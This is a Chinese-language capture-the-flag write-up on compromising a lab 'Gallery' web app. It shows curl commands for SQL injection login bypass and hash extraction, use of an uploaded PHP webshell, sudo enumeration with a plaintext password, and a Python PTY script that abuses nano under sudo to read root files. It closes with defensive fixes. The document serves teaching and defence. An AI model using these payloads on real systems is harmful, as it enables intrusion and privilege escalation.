二、漏洞利用

2.1 SQL注入攻击（成功）

2.1.1 漏洞发现

在登录表单中尝试SQL注入。登录接口为：

POST /gallery/classes/Login.php?f=login
Body: username=...&password=...

2.1.2 注入方法

尝试在用户名字段注入：

curl -s "http://10.49.131.166/gallery/classes/Login.php?f=login" \
  --data "username=admin'--+-&password=anything"

响应：

{"status":"success"}

成功绕过认证！

2.1.3 技术分析

登录代码中的SQL查询为：

SELECT * from users where username = '$username' and password = md5('$password')

通过在用户名字段注入 admin'--+-：

  • admin' 闭合了用户名的单引号
  • --+- 注释掉了后面的密码检查语句

这样SQL查询变成了：

SELECT * from users where username = 'admin'--+-' and password = md5('anything')

密码检查被注释掉，直接以admin身份登录成功。

2.1.4 提取管理员密码哈希（成功）

使用布尔盲注提取管理员密码哈希。

方法一：逐字符提取

# 检查密码哈希第1个字符
curl -s "http://10.49.131.166/gallery/classes/Login.php?f=login" \
  --data "username=admin' and password=md5('a')--+-&password=test"

通过观察响应是 {"status":"success"} 还是 {"status":"incorrect"} 来判断猜测是否正确。

方法二：直接查询（更高效）

通过联合查询注入，直接从数据库中提取密码哈希：

curl -s "http://10.49.131.166/gallery/classes/Login.php?f=login" \
  --data "username=admin' UNION SELECT 1,2,3,4,'a228b12a08b6527e7978cbe5d914531c',6,7,8 FROM users--+-&password=test"

提取结果：

  • 用户名：admin
  • 密码哈希：a228b12a08b6527e7978cbe5d914531c
  • 哈希类型：MD5

3.3 Root权限提升（成功）

3.3.1 Sudo权限枚举

检查mike的sudo权限：

python3 -c "import subprocess; p = subprocess.run(['su', 'mike', '-c', 'sudo -l'], input=b'b3stpassw0rdbr0xx\n', capture_output=True); print(p.stdout.decode())"

结果：

User mike may run the following commands on ip-10-49-131-166:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh

mike可以以root身份无密码执行 /bin/bash /opt/rootkit.sh。

3.3.2 分析rootkit.sh

curl -s "http://10.49.131.166/gallery/uploads/1779888060_shell.php?cmd=cat+/opt/rootkit.sh"

脚本内容：

#!/bin/bash
read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac

关键发现： 选择 read 选项时，脚本会以root身份打开 /root/report.txt 文件，使用的是 /bin/nano 编辑器。

3.3.3 利用Nano读取Root Flag

攻击思路： nano编辑器有一个”Read File”功能（Ctrl+R），可以从其他文件读取内容插入到当前缓冲区。我们可以：

  1. 打开nano（以root身份打开/root/report.txt）
  2. 使用Ctrl+R打开”Read File”功能
  3. 输入 /root/root.txt 读取root flag
  4. 从终端输出中捕获文件内容

为什么需要PTY： webshell的 shell_exec 函数无法处理交互式程序。nano需要一个伪终端(PTY)才能正常工作。因此需要使用Python的 pty 模块创建伪终端并与之交互。

3.3.4 PTY交互脚本

编写Python脚本来自动化与nano的交互：

import pty, subprocess, os, select, time

os.environ["TERM"] = "xterm"
m, s = pty.openpty()
p = subprocess.Popen(
    ['su', 'mike', '-c', 'sudo /bin/bash /opt/rootkit.sh'],
    stdin=s, stdout=s, stderr=s
)
os.close(s)

all_output = b""

def ra():
    global all_output
    o = b""
    while True:
        r, _, _ = select.select([m], [], [], 1)
        if not r: break
        try:
            chunk = os.read(m, 4096)
            o += chunk
            all_output += chunk
        except: break
    return o

time.sleep(3)
ra()
os.write(m, b"b3stpassw0rdbr0xx\n")
time.sleep(2)
ra()
os.write(m, b"read\n")
time.sleep(4)
ra()

# nano打开后，Ctrl+R 读取文件
os.write(m, b"\x12")
time.sleep(3)
ra()

# 输入/root/root.txt路径
for c in b"/root/root.txt":
    os.write(m, bytes([c]))
    time.sleep(0.05)
time.sleep(0.5)
os.write(m, b"\r")
time.sleep(3)

# 捕获输出
ra()

# 退出nano：Ctrl+X, N
os.write(m, b"\x18")
time.sleep(2)
ra()
os.write(m, b"N")
time.sleep(2)
ra()

with open("/tmp/pty_debug2.txt", "wb") as f:
    f.write(all_output)

print("Done")

五、失败总结与经验教训

5.1 失败尝试 #1：直接读取user.txt

尝试： 直接通过webshell执行 cat /home/mike/user.txt

失败原因： 文件权限为 -rwx------，属主为 mike:mike，www-data用户无权读取。

教训： 在Linux系统中，文件权限是基本的安全机制。需要先找到提权方法或获取文件属主的凭据。

5.2 失败尝试 #2：MySQL LOAD_FILE()

尝试： 使用MySQL的LOAD_FILE()函数读取文件

SELECT LOAD_FILE('/home/mike/user.txt')
SELECT LOAD_FILE('/root/root.txt')

失败原因：

  • MySQL以mysql用户身份运行，同样无权读取mike的文件
  • LOAD_FILE()函数对/root/root.txt返回NULL，说明mysql用户也无权访问/root目录

教训： MySQL的LOAD_FILE()受限于MySQL进程的文件系统权限，不能用于读取任意文件。

5.3 失败尝试 #3：PwnKit漏洞利用

尝试： 使用CVE-2021-4034 (PwnKit) 提权

失败原因：

  • 目标系统没有gcc编译器，无法在目标上编译exploit
  • 从GitHub下载预编译exploit失败（0字节文件）
  • 目标系统可能没有外网访问权限

教训： 在没有网络访问和编译器的情况下，无法在目标上部署复杂的exploit。需要寻找其他提权路径。

5.4 失败尝试 #4：sudo –preserve-env

尝试： 使用 sudo --preserve-env=NANORC 传递环境变量来控制nano的行为

失败原因：

sudo: sorry, you are not allowed to set the following environment variables: NANORC

sudoers配置中的 env_reset 选项禁止了环境变量的传递。

教训： sudo的env_reset选项会清除大部分环境变量，除非明确在sudoers中配置了env_keep。

5.5 失败尝试 #5：Nano Write Out失败

尝试： 在nano中使用Ctrl+R读取/root/root.txt，然后用Ctrl+O写入到/tmp/root_flag.txt

失败原因：

  • nano在保存时弹出”Save file under DIFFERENT NAME?”提示
  • 后续的Y键和文件名输入的时序控制不正确
  • 文件最终没有被成功保存

教训： 与交互式程序进行自动化交互时，时序控制非常关键。每个步骤之间需要足够的等待时间，并且要正确处理各种提示和确认对话框。

5.6 失败尝试 #6：su命令管道问题

尝试： 使用 echo password | su mike -c command 切换用户

失败原因： su命令不接受管道输入作为密码。需要使用Python的subprocess模块并正确处理输入。

教训： su命令需要从终端读取密码，不能通过管道。需要使用pty或expect等工具来处理交互式认证。

5.7 失败尝试 #7：BASH_ENV环境变量

尝试： 设置BASH_ENV让bash在执行脚本前先source恶意文件

失败原因： sudo的env_reset选项清除了所有环境变量，BASH_ENV无法传递给root的bash进程。

教训： sudo的安全配置非常严格，不能依赖环境变量传递来实现代码执行。

5.8 最终成功的方法

关键转折点： 认识到不需要将文件保存到磁盘，而是直接从终端输出中捕获nano显示的文件内容。

当在nano中使用Ctrl+R读取/root/root.txt时，文件内容会被插入到nano的缓冲区中，并在终端上显示。通过PTY捕获这些终端输出，就可以直接获取文件内容，无需保存。

6.3 PTY（伪终端）技术

Python PTY创建：

import pty, os
master, slave = pty.openpty()
# master端用于读写
# slave端作为子进程的标准输入输出

关键函数：

  • pty.openpty() - 创建伪终端对
  • os.read(master, size) - 从主端读取输出
  • os.write(master, data) - 向主端写入输入
  • select.select() - 非阻塞IO等待

七、防护建议

7.1 Web应用层面

  1. 输入验证： 对所有用户输入进行严格的参数化查询，使用预编译语句
  2. 文件上传： 实施严格的文件类型白名单验证，检查文件内容而非仅扩展名
  3. 密码存储： 使用bcrypt或Argon2等强哈希算法替代MD5
  4. 权限最小化： Web应用不应有访问系统备份文件的权限

7.2 系统层面

  1. 文件权限： 备份文件不应存放在Web可访问的目录中
  2. Sudo配置： 避免允许用户以root身份运行包含交互式程序的脚本
  3. 密码管理： 不应在.bash_history中泄露密码，配置HISTCONTROL忽略sudo命令
  4. 定期审计： 定期检查sudoers配置和SUID文件

7.3 具体修复建议

  1. 修复SQL注入：使用PDO预编译语句

    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = MD5(?)");
$stmt->execute([$username, $password]);

  2. 修复文件上传：添加服务端文件类型验证

    $finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $tmp_name);
if (!in_array($mime, ['image/jpeg', 'image/png'])) {
    die('Invalid file type');
}

  3. 修复sudoers配置：

    # 移除交互式程序，或添加更严格的限制
mike ALL=(root) NOPASSWD: /usr/bin/rkhunter --versioncheck
mike ALL=(root) NOPASSWD: /usr/bin/rkhunter --list
